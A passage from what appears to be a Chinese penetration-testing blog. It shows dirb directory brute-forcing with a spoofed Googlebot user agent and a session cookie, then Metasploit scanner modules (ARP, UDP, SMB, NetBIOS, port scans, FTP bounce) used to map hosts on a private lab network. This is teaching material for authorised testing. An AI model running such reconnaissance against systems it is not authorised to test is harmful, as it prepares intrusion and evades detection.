(CODE:301|SIZE:150)+ http://192.168.1.102//install (CODE:301|SIZE:152) (!) FATAL: Too many errors connecting to host(Possible cause: EMPTY REPLY FROM SERVER) ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐END_TIME: Sun Feb 17 23:31:06 2019DOWNLOADED: 1495 ‐ FOUND: 10 0x04 自定义User-Agent1234567891011121314151617181920212223root@John:~/wordlist/small# dirb http://192.168.1.102 ./ASPX.txt ‐a \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\"‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐DIRB v2.22By The Dark Raver‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ START_TIME: Sun Feb 17 23:34:51 2019URL_BASE: http://192.168.1.102/WORDLIST_FILES: ./ASPX.txtUSER_AGENT: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ GENERATED WORDS: 822‐‐‐‐ Scanning URL: http://192.168.1.102/ ‐‐‐‐+ http://192.168.1.102//Index.aspx (CODE:200|SIZE:2735)+ http://192.168.1.102//Manage/Default.aspx (CODE:302|SIZE:203) ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐END_TIME: Sun Feb 17 23:34:54 2019DOWNLOADED: 822 ‐ FOUND: 2 0x05 自定义Cookie1234567891011121314151617181920212223242526272829303132root@John:~/wordlist/small# dirb http://192.168.1.102/Manage ./DIR.txt ‐a \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\" ‐c \"ASP.NET_SessionId=jennqviqmc2vws55o4ggwu45\"‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐DIRB v2.22By The Dark Raver‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ START_TIME: Sun Feb 17 23:53:08 2019URL_BASE: http://192.168.1.102/Manage/WORDLIST_FILES: ./DIR.txtUSER_AGENT: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)COOKIE: ASP.NET_SessionId=jennqviqmc2vws55o4ggwu45 ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ GENERATED WORDS: 1153 ‐‐‐‐ Scanning URL: http://192.168.1.102/Manage/ ‐‐‐‐+ http://192.168.1.102/Manage//include/ (CODE:403|SIZE:218)+ http://192.168.1.102/Manage//news/ (CODE:403|SIZE:218)+ http://192.168.1.102/Manage//include (CODE:301|SIZE:159)+ http://192.168.1.102/Manage//images/ (CODE:403|SIZE:218)+ http://192.168.1.102/Manage//sys/ (CODE:403|SIZE:218)+ http://192.168.1.102/Manage//images (CODE:301|SIZE:158) (!) FATAL: Too many errors connecting to host(Possible cause: EMPTY REPLY FROM SERVER) ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐END_TIME: Sun Feb 17 23:53:10 2019DOWNLOADED: 673 ‐ FOUND: 6 0x06 自定义毫秒延迟123456789101112131415161718192021222324252627282930313233root@John:~/wordlist/small# dirb http://192.168.1.102/Manage ./DIR.txt ‐a \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\" ‐c \"ASP.NET_SessionId=jennqviqmc2vws55o4ggwu45\" ‐z 100‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐DIRB v2.22By The Dark Raver‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ START_TIME: Sun Feb 17 23:54:29 2019URL_BASE: http://192.168.1.102/Manage/WORDLIST_FILES: ./DIR.txtUSER_AGENT: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)COOKIE: ASP.NET_SessionId=jennqviqmc2vws55o4ggwu45SPEED_DELAY: 100 milliseconds ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐GENERATED WORDS: 1153 ‐‐‐‐ Scanning URL: http://192.168.1.102/Manage/ ‐‐‐‐+ http://192.168.1.102/Manage//include/ (CODE:403|SIZE:218)+ http://192.168.1.102/Manage//news/ (CODE:403|SIZE:218)+ http://192.168.1.102/Manage//include (CODE:301|SIZE:159)+ http://192.168.1.102/Manage//images/ (CODE:403|SIZE:218)+ http://192.168.1.102/Manage//sys/ (CODE:403|SIZE:218)+ http://192.168.1.102/Manage//images (CODE:301|SIZE:158) (!) FATAL: Too many errors connecting to host(Possible cause: EMPTY REPLY FROM SERVER) ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐END_TIME: Sun Feb 17 23:55:50 2019DOWNLOADED: 673 ‐ FOUND: 6 0x07 More功能12345678910111213141516171819202122232425262728293031323334353637383940414243DIRB v2.22By The Dark Raver‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ dirb &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options] ========================= NOTES =========================&lt;url_base&gt; : Base URL to scan. (Use ‐resume for session resuming)&lt;wordlist_file(s)&gt; : List of wordfiles. (wordfile1,wordfile2,wordfile3...)======================== HOTKEYS ========================&apos;n&apos; ‐&gt; Go to next directory.&apos;q&apos; ‐&gt; Stop scan. (Saving state for resume)&apos;r&apos; ‐&gt; Remaining scan stats.======================== OPTIONS ========================‐a &lt;agent_string&gt; : Specify your custom USER_AGENT.‐b : Use path as is.‐c &lt;cookie_string&gt; : Set a cookie for the HTTP request.‐E &lt;certificate&gt; : path to the client certificate.‐f : Fine tunning of NOT_FOUND (404) detection.‐H &lt;header_string&gt; : Add a custom header to the HTTP request.‐i : Use case‐insensitive search.‐l : Print &quot;Location&quot; header when found.‐N &lt;nf_code&gt;: Ignore responses with this HTTP code.‐o &lt;output_file&gt; : Save output to disk.‐p &lt;proxy[:port]&gt; : Use this proxy. (Default port is 1080)‐P &lt;proxy_username:proxy_password&gt; : Proxy Authentication.‐r : Don&apos;t search recursively.‐R : Interactive recursion. (Asks for each directory)‐S : Silent Mode. Don&apos;t show tested words. (For dumb terminals)‐t : Don&apos;t force an ending &apos;/&apos; on URLs.‐u &lt;username:password&gt; : HTTP Authentication.‐v : Show also NOT_FOUND pages.‐w : Don&apos;t stop on WARNING messages.‐X &lt;extensions&gt; / ‐x &lt;exts_file&gt; : Append each word with this extensions.‐z &lt;millisecs&gt; : Add a milliseconds delay to not cause excessive Flood.======================== EXAMPLES =======================dirb http://url/directory/ (Simple Test)dirb http://url/ ‐X .html (Test files with &apos;.html&apos; extension)dirb http://url/ /usr/share/dirb/wordlists/vulns/apache.txt (Test wit hapache.txt wordlist)dirb https://secure_url/ (Simple Test with SSL)","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"工具","slug":"工具","permalink":"https://www.mi1k7ea.com/tags/工具/"}]},{"title":"基于MSF的内网存活主机探测","date":"2021-02-24T13:28:04.000Z","path":"2021/02/24/基于MSF的内网存活主机探测/","text":"0x00 前言参考Micro8系列第二十三课：https://micro8.gitbook.io/micro8/contents-1/21-30/22-ji-yu-smb-fa-xian-nei-wang-cun-huo-zhu-ji 参考Micro8系列第二十四课：https://micro8.gitbook.io/micro8/contents-1/21-30/24-ji-yu-msf-fa-xian-nei-wang-cun-huo-zhu-ji-di-er-ji 参考Micro8系列第二十五课：https://micro8.gitbook.io/micro8/contents-1/21-30/25-ji-yu-msf-fa-xian-nei-wang-cun-huo-zhu-ji-di-san-ji 参考Micro8系列第二十六课：https://micro8.gitbook.io/micro8/contents-1/21-30/26-ji-yu-msf-fa-xian-nei-wang-cun-huo-zhu-ji-di-si-ji 参考Micro8系列第二十七课：https://micro8.gitbook.io/micro8/contents-1/21-30/27-ji-yu-msf-fa-xian-nei-wang-cun-huo-zhu-ji-di-wu-ji 参考Micro8系列第二十八课：https://micro8.gitbook.io/micro8/contents-1/21-30/28-ji-yu-msf-fa-xian-nei-wang-cun-huo-zhu-ji-di-liu-ji#er-shi-ba-ji-yu-windowsgatherenumdomain-fa-xian-yu-zhong-cun-huo-zhu-ji 0x01 search支持type类型搜索123456789101112131415msf6 &gt; search scanner type:auxiliaryMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/appletv/appletv_display_image normal No Apple TV Image Remote Control 1 auxiliary/admin/appletv/appletv_display_video normal No Apple TV Video Remote Control 2 auxiliary/admin/smb/check_dir_file normal No SMB Scanner Check File/Directory Utility 3 auxiliary/admin/teradata/teradata_odbc_sql 2018-03-29 normal No Teradata ODBC SQL Query Module... 588 auxiliary/scanner/wproxy/att_open_proxy 2017-08-31 normal No Open WAN-to-LAN proxy on AT&amp;T routers 589 auxiliary/scanner/wsdd/wsdd_query normal No WS-Discovery Information Discovery 590 auxiliary/scanner/x11/open_x11 normal No X11 No-Auth Scanner 0x02 auxiliary/scanner/discovery/arp_sweep该模块是基于ARP协议来发现内网存活主机。 12345678910111213141516171819202122msf6 &gt; use auxiliary/scanner/discovery/arp_sweepmsf6 auxiliary(scanner/discovery/arp_sweep) &gt; show optionsModule options (auxiliary/scanner/discovery/arp_sweep): Name Current Setting Required Description ---- --------------- -------- ----------- INTERFACE no The name of the interface RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &apos;file:&lt;path&gt;&apos; SHOST no Source IP Address SMAC no Source MAC Address THREADS 1 yes The number of concurrent threads (max one per host) TIMEOUT 5 yes The number of seconds to wait for new datamsf6 auxiliary(scanner/discovery/arp_sweep) &gt; set RHOSTS 172.17.0.0/24RHOSTS =&gt; 172.17.0.0/24msf6 auxiliary(scanner/discovery/arp_sweep) &gt; exploitSIOCSIFFLAGS: Operation not permitted[+] 172.17.0.1 appears to be up (UNKNOWN).[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed 0x03 auxiliary/scanner/discovery/udp_sweep该模块是基于UDP协议来发现内网存活主机。 123456789101112131415161718192021msf auxiliary(scanner/discovery/udp_sweep) &gt; show options Module options (auxiliary/scanner/discovery/udp_sweep): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐BATCHSIZE 256 yes The number of hosts to probe in each setRHOSTS 192.168.1.0/24 yes The target address range or CIDR identifierTHREADS 50 yes The number of concurrent threads msf auxiliary(scanner/discovery/udp_sweep) &gt; exploit [*] Sending 13 probes to 192.168.1.0‐&gt;192.168.1.255 (256 hosts)[*] Discovered DNS on 192.168.1.1:53 (ce2a8500000100010000000007564552 53494f4e0442494e440000100003c00c0010000300000001001a19737572656c7920796f75206d757374206265206a6f6b696e67)[*] Discovered NetBIOS on 192.168.1.2:137 (JOHN‐PC:&lt;00&gt;:U :WORKGROUP:&lt;00&gt;:G :JOHN‐PC:&lt;20&gt;:U :WORKGROUP:&lt;1e&gt;:G :WORKGROUP:&lt;1d&gt;:U:__MSBROWSE__ &lt;01&gt;:G :4c:cc:6a:e3:51:27)[*] Discovered NetBIOS on 192.168.1.119:137 (WIN03X64:&lt;00&gt;:U :WIN03X64:&lt;20&gt;:U :WORKGROUP:&lt;00&gt;:G :WORKGROUP:&lt;1e&gt;:G :WIN03X64:&lt;03&gt;:U:ADMINISTRA TOR:&lt;03&gt;:U :WIN03X64:&lt;01&gt;:U :00:0c:29:85:d6:7d)[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed 0x04 auxiliary/scanner/discovery/udp_probe该模块是基于UDP协议来发现内网存活主机。 123456789101112131415161718192021222324252627282930msf auxiliary(scanner/discovery/udp_probe) &gt; show options Module options (auxiliary/scanner/discovery/udp_probe): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐CHOST no The local client addressRHOSTS 192.168.1.0/24 yes The target address range or CIDR identifierTHREADS 50 yes The number of concurrent threads msf auxiliary(scanner/discovery/udp_probe) &gt; exploit [+] Discovered NetBIOS on 192.168.1.2:137 (JOHN‐PC:&lt;00&gt;:U :WORKGROUP:&lt;00&gt;:G :JOHN‐PC:&lt;20&gt;:U :WORKGROUP:&lt;1e&gt;:G :WORKGROUP:&lt;1d&gt;:U:__MSBROWSE__ &lt;01&gt;:G :4c:cc:6a:e3:51:27)[+] Discovered DNS on 192.168.1.1:53 (de778500000100010000000007564552 53494f4e0442494e440000100003c00c0010000300000001001a19737572656c7920796f75206d757374206265206a6f6b696e67)[*] Scanned 43 of 256 hosts (16% complete)[*] Scanned 52 of 256 hosts (20% complete)[*] Scanned 89 of 256 hosts (34% complete)[+] Discovered NetBIOS on 192.168.1.119:137 (WIN03X64:&lt;00&gt;:U :WIN03X64:&lt;20&gt;:U :WORKGROUP:&lt;00&gt;:G :WORKGROUP:&lt;1e&gt;:G :WIN03X64:&lt;03&gt;:U:ADMINISTRA TOR:&lt;03&gt;:U :WIN03X64:&lt;01&gt;:U :00:0c:29:85:d6:7d)[*] Scanned 103 of 256 hosts (40% complete)[*] Scanned 140 of 256 hosts (54% complete)[*] Scanned 163 of 256 hosts (63% complete)[*] Scanned 184 of 256 hosts (71% complete)[*] Scanned 212 of 256 hosts (82% complete)[*] Scanned 231 of 256 hosts (90% complete)[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed 0x05 auxiliary/scanner/dns/dns_amp该模块是基于DNS协议来发现内网存活主机。 12345678910111213141516171819202122232425msf auxiliary(scanner/dns/dns_amp) &gt; show options Module options (auxiliary/scanner/dns/dns_amp): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐BATCHSIZE 256 yes The number of hosts to probe in each setDOMAINNAME isc.org yes Domain to use for the DNS requestFILTER no The filter string for capturing trafficINTERFACE no The name of the interfacePCAPFILE no The name of the PCAP capture file to processQUERYTYPE ANY yes Query type(A, NS, SOA, MX, TXT, AAAA, RRSIG, DNSKEY, ANY)RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifierRPORT 53 yes The target port (UDP)SNAPLEN 65535 yes The number of bytes to captureTHREADS 50 yes The number of concurrent threadsTIMEOUT 500 yes The number of seconds to wait for new data msf auxiliary(scanner/dns/dns_amp) &gt; exploit [*] Sending DNS probes to 192.168.1.0‐&gt;192.168.1.255 (256 hosts)[*] Sending 67 bytes to each host using the IN ANY isc.org request[+] 192.168.1.1:53 ‐ Response is 530 bytes [7.91x Amplification][*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed 0x06 auxiliary/scanner/http/http_version该模块用于探测内网的HTTP服务。 12345678910111213141516171819202122232425262728msf auxiliary(scanner/http/http_version) &gt; show options Module options (auxiliary/scanner/http/http_version): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐Proxies no A proxy chain of format type:host:port[,type:host:port] [...]RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifierRPORT 80 yes The target port (TCP)SSL false no Negotiate SSL/TLS for outgoing connectionsTHREADS 20 yes The number of concurrent threadsVHOST no HTTP server virtual host msf auxiliary(scanner/http/http_version) &gt; exploit [+] 192.168.1.1:80[*] Scanned 27 of 256 hosts (10% complete)[*] Scanned 63 of 256 hosts (24% complete)[*] Scanned 82 of 256 hosts (32% complete)[*] Scanned 103 of 256 hosts (40% complete)[+] 192.168.1.119:80 Microsoft‐IIS/6.0 ( Powered by ASP.NET )[*] Scanned 129 of 256 hosts (50% complete)[*] Scanned 154 of 256 hosts (60% complete)[*] Scanned 182 of 256 hosts (71% complete)[*] Scanned 205 of 256 hosts (80% complete)[*] Scanned 231 of 256 hosts (90% complete)[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed 0x07 auxiliary/scanner/ftp/ftp_version该模块用于探测内网的FTP服务。 1234567891011121314151617181920212223242526msf auxiliary(scanner/ftp/ftp_version) &gt; show options Module options (auxiliary/scanner/ftp/ftp_version): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐FTPPASS mozilla@example.com no The password for the specified usernameFTPUSER anonymous no The username to authenticate asRHOSTS 192.168.1.0/24 yes The target address range or CIDR identifierRPORT 21 yes The target port (TCP)THREADS 50 yes The number of concurrent threads msf auxiliary(scanner/ftp/ftp_version) &gt; exploit [*] Scanned 51 of 256 hosts (19% complete)[*] Scanned 52 of 256 hosts (20% complete)[*] Scanned 100 of 256 hosts (39% complete)[+] 192.168.1.119:21 ‐ FTP Banner: &apos;220 Microsoft FTP Service\\x0d\\x0a&apos;[*] Scanned 103 of 256 hosts (40% complete)[*] Scanned 133 of 256 hosts (51% complete)[*] Scanned 183 of 256 hosts (71% complete)[*] Scanned 197 of 256 hosts (76% complete)[*] Scanned 229 of 256 hosts (89% complete)[*] Scanned 231 of 256 hosts (90% complete)[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed 0x08 auxiliary/scanner/smb/smb_version该模块用于探测内网的SMB服务。 123456789101112131415161718192021222324252627msf auxiliary(scanner/smb/smb_version) &gt; show options Module options (auxiliary/scanner/smb/smb_version): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifierSMBDomain . no The Windows domain to use for authenticationSMBPass no The password for the specified usernameSMBUser no The username to authenticate asTHREADS 20 yes The number of concurrent threads msf auxiliary(scanner/smb/smb_version) &gt; exploit [+] 192.168.1.2:445 ‐ Host is running Windows 7 Ultimate SP1 (build:7601) (name:JOHN‐PC) (workgroup:WORKGROUP )[*] Scanned 40 of 256 hosts (15% complete)[*] Scanned 60 of 256 hosts (23% complete)[*] Scanned 79 of 256 hosts (30% complete)[+] 192.168.1.119:445 ‐ Host is running Windows 2003 R2 SP2 (build:3790) (name:WIN03X64)[*] Scanned 103 of 256 hosts (40% complete)[*] Scanned 128 of 256 hosts (50% complete)[*] Scanned 154 of 256 hosts (60% complete)[*] Scanned 181 of 256 hosts (70% complete)[*] Scanned 206 of 256 hosts (80% complete)[*] Scanned 231 of 256 hosts (90% complete)[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed 0x09 auxiliary/scanner/ssh/ssh_version该模块用于探测内网的SSH服务。 12345678910111213141516171819202122232425262728msf auxiliary(scanner/ssh/ssh_version) &gt; show options Module options (auxiliary/scanner/ssh/ssh_version): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifierRPORT 22 yes The target port (TCP)THREADS 50 yes The number of concurrent threadsTIMEOUT 30 yes Timeout for the SSH probe msf auxiliary(scanner/ssh/ssh_version) &gt; exploit [+] 192.168.1.5:22 ‐ SSH server version: SSH‐2.0‐OpenSSH_7.9p1 Debian‐5 ( service.version=7.9p1 openssh.comment=Debian‐5 service.vendor=OpenBSDservice.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.9p1 os.vendor=Debian os.family=Linux os.product=Linux os.cpe23=cpe:/o:debian:debian_linux:‐ service.protocol=ssh fingerprint_db=ssh.banner )[*] Scanned 52 of 256 hosts (20% complete)[*] Scanned 95 of 256 hosts (37% complete)[*] Scanned 100 of 256 hosts (39% complete)[*] Scanned 103 of 256 hosts (40% complete)[*] Scanned 131 of 256 hosts (51% complete)[*] Scanned 154 of 256 hosts (60% complete)[*] Scanned 180 of 256 hosts (70% complete)[*] Scanned 206 of 256 hosts (80% complete)[*] Scanned 235 of 256 hosts (91% complete)[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed 0x0A auxiliary/scanner/telnet/telnet_version该模块用于探测内网的TELNET服务。 123456789101112131415161718msf auxiliary(scanner/telnet/telnet_version) &gt; show options Module options (auxiliary/scanner/telnet/telnet_version): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐PASSWORD no The password for the specified usernameRHOSTS 192.168.1.119 yes The target address range or CIDR identifierRPORT 23 yes The target port (TCP)THREADS 50 yes The number of concurrent threadsTIMEOUT 30 yes Timeout for the Telnet probeUSERNAME no The username to authenticate as msf auxiliary(scanner/telnet/telnet_version) &gt; exploit [+] 192.168.1.119:23 ‐ 192.168.1.119:23 TELNET Welcome to Microsoft Telnet Service \\x0a\\x0a\\x0dlogin:[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 0x0B auxiliary/scanner/mysql/mysql_version该模块用于探测内网的MySQL服务。 123456789101112131415msf auxiliary(scanner/mysql/mysql_version) &gt; show options Module options (auxiliary/scanner/mysql/mysql_version): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐RHOSTS 192.168.1.115 yes The target address range or CIDR identifierRPORT 3306 yes The target port (TCP)THREADS 50 yes The number of concurrent threads msf auxiliary(scanner/mysql/mysql_version) &gt; exploit [+] 192.168.1.115:3306 ‐ 192.168.1.115:3306 is running MySQL 5.1.52‐community (protocol 10)[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 0x0C auxiliary/scanner/netbios/nbname该模块是基于NetBIOS来发现内网存活主机。 12345678910111213141516171819msf auxiliary(scanner/netbios/nbname) &gt; show options Module options (auxiliary/scanner/netbios/nbname): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐BATCHSIZE 256 yes The number of hosts to probe in each setRHOSTS 192.168.1.0/24 yes The target address range or CIDR identifierRPORT 137 yes The target port (UDP)THREADS 50 yes The number of concurrent threads msf auxiliary(scanner/netbios/nbname) &gt; exploit [*] Sending NetBIOS requests to 192.168.1.0‐&gt;192.168.1.255 (256 hosts)[+] 192.168.1.2 [JOHN‐PC] OS:Windows Names:(JOHN‐PC, WORKGROUP, __MSBROWSE__) Addresses:(192.168.1.2, 192.168.163.1, 192.168.32.1)Mac:4c:cc:6a:e3:51:27[+] 192.168.1.115 [VM_2003X86] OS:Windows Names:(VM_2003X86,WORKGROUP) Addresses:(192.168.1.115) Mac:00:0c:29:af:ce:cc Virtual Machine:VMWare[+] 192.168.1.119 [WIN03X64] OS:Windows User:ADMINISTRATOR Names:(WIN03X64, WORKGROUP, ADMINISTRATOR) Addresses:(192.168.1.119)Mac:00:0c:29:85:d6:7d Virtual Machine:VMWare[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed 0x0D auxiliary/scanner/http/title该模块用于探测内网的HTTP服务。 1234567891011121314151617181920msf auxiliary(scanner/http/title) &gt; show options Module options (auxiliary/scanner/http/title): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐Proxies no A proxy chain of format type:host:port[,type:host:port] [...]RHOSTS 192.168.1.115,119 yes The target address range or CIDR identifierRPORT 80 yes The target port (TCP)SHOW_TITLES true yes Show the titles on the console as they are grabbedSSL false no Negotiate SSL/TLS for outgoing connectionsSTORE_NOTES true yes Store the captured information in notes. Use &quot;no tes‐t http.title&quot; to viewTARGETURI / yes The base pathTHREADS 50 yes The number of concurrent threads msf auxiliary(scanner/http/title) &gt; exploit [*] [192.168.1.115:80] [C:200] [R:] [S:Microsoft‐IIS/6.0] 协同管理系统[*] Scanned 2 of 2 hosts (100% complete)[*] Auxiliary module execution completed 0x0E auxiliary/scanner/db2/db2_version该模块用于探测内网的db2服务。 1234567891011121314msf auxiliary(scanner/http/title) &gt; use auxiliary/scanner/db2/db2_versionmsf auxiliary(scanner/db2/db2_version) &gt; show options Module options (auxiliary/scanner/db2/db2_version): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐DATABASE toolsdb yes The name of the target databaseRHOSTS 192.168.1.0/24 yes The target address range or CIDR identifierRPORT 50000 yes The target port (TCP)THREADS 50 yes The number of concurrent threadsTIMEOUT 5 yes Timeout for the DB2 probe msf auxiliary(scanner/db2/db2_version) &gt; exploit 0x0F auxiliary/scanner/portscan/ack该模块是基于TCP协议的ACK报文扫描端口来发现内网存活主机。 12345678910111213141516171819202122msf auxiliary(scanner/portscan/ack) &gt; show options Module options (auxiliary/scanner/portscan/ack): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐BATCHSIZE 256 yes The number of hosts to scan per setDELAY 0 yes The delay between connections, per thread, in millisecondsINTERFACE no The name of the interfaceJITTER 0 yes The delay jitter factor (maximum value by which to +/‐ DELAY) in milliseconds.PORTS 445 yes Ports to scan (e.g. 22‐25,80,110‐900)RHOSTS 192.168.1.115,119 yes The target address range or CIDR identifierSNAPLEN 65535 yes The number of bytes to captureTHREADS 50 yes The number of concurrent threadsTIMEOUT 500 yes The reply read timeout in milliseconds msf auxiliary(scanner/portscan/ack) &gt; exploit [*] TCP UNFILTERED 192.168.1.115:445[*] TCP UNFILTERED 192.168.1.119:445[*] Scanned 2 of 2 hosts (100% complete)[*] Auxiliary module execution completed 0x10 auxiliary/scanner/portscan/tcp该模块是基于TCP协议扫描端口来发现内网存活主机。 12345678910111213141516171819202122msf auxiliary(scanner/portscan/tcp) &gt; show options Module options (auxiliary/scanner/portscan/tcp): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐CONCURRENCY 10 yes The number of concurrent ports to check per hostDELAY 0 yes The delay between connections, per thread, in millisecondsJITTER 0 yes The delay jitter factor (maximum value by which to +/‐ DELAY) in milliseconds.PORTS 445 yes Ports to scan (e.g. 22‐25,80,110‐900)RHOSTS 192.168.1.115,119,2 yes The target address range or CIDR identifierTHREADS 50 yes The number of concurrent threadsTIMEOUT 1000 yes The socket connect timeout in millisecondsmsf auxiliary(scanner/portscan/tcp) &gt; exploit [+] 192.168.1.2: ‐ 192.168.1.2:445 ‐ TCP OPEN[*] Scanned 1 of 3 hosts (33% complete)[+] 192.168.1.119: ‐ 192.168.1.119:445 ‐ TCP OPEN[+] 192.168.1.115: ‐ 192.168.1.115:445 ‐ TCP OPEN[*] Scanned 3 of 3 hosts (100% complete)[*] Auxiliary module execution completed 0x11 auxiliary/scanner/portscan/syn该模块是基于TCP协议的SYN报文扫描端口来发现内网存活主机。 12345678910111213141516171819202122msf auxiliary(scanner/portscan/syn) &gt; show options Module options (auxiliary/scanner/portscan/syn): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐BATCHSIZE 256 yes The number of hosts to scan per setDELAY 0 yes The delay between connections, per thread, in millisecond sINTERFACE no The name of the interfaceJITTER 0 yes The delay jitter factor (maximum value by which to +/‐ DELAY) in milliseconds.PORTS 445 yes Ports to scan (e.g. 22‐25,80,110‐900)RHOSTS 192.168.1.115 yes The target address range or CIDR identifierSNAPLEN 65535 yes The number of bytes to captureTHREADS 50 yes The number of concurrent threadsTIMEOUT 500 yes The reply read timeout in milliseconds msf auxiliary(scanner/portscan/syn) &gt; exploit [+] TCP OPEN 192.168.1.115:445[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 0x12 auxiliary/scanner/portscan/ftpbounce该模块是基于FTP Bounce攻击来发现内网存活主机。 123456789101112131415161718192021222324msf auxiliary(scanner/portscan/ftpbounce) &gt; show options Module options (auxiliary/scanner/portscan/ftpbounce): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐BOUNCEHOST 192.168.1.119 yes FTP relay hostBOUNCEPORT 21 yes FTP relay portDELAY 0 yes The delay between connections, per thread, in millisecond sFTPPASS mozilla@example.com no The password for the specified usernam eFTPUSER anonymous no The username to authenticate asJITTER 0 yes The delay jitter factor (maximum value by which to +/‐ DELAY) in milliseconds.PORTS 22‐25 yes Ports to scan (e.g. 22‐25,80,110‐900)RHOSTS 192.168.1.119 yes The target address range or CIDR identifierTHREADS 50 yes The number of concurrent threads msf auxiliary(scanner/portscan/ftpbounce) &gt; exploit [+] 192.168.1.119:21 ‐ TCP OPEN 192.168.1.119:22[+] 192.168.1.119:21 ‐ TCP OPEN 192.168.1.119:23[+] 192.168.1.119:21 ‐ TCP OPEN 192.168.1.119:24[+] 192.168.1.119:21 ‐ TCP OPEN 192.168.1.119:25[*] 192.168.1.119:21 ‐ Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 0x13 auxiliary/scanner/portscan/xmas该模块是基于TCP Xmax扫描来发现内网存活主机。 1234567891011121314151617msf auxiliary(scanner/portscan/xmas) &gt; show options Module options (auxiliary/scanner/portscan/xmas): Name Current Setting Required Description‐‐‐‐ 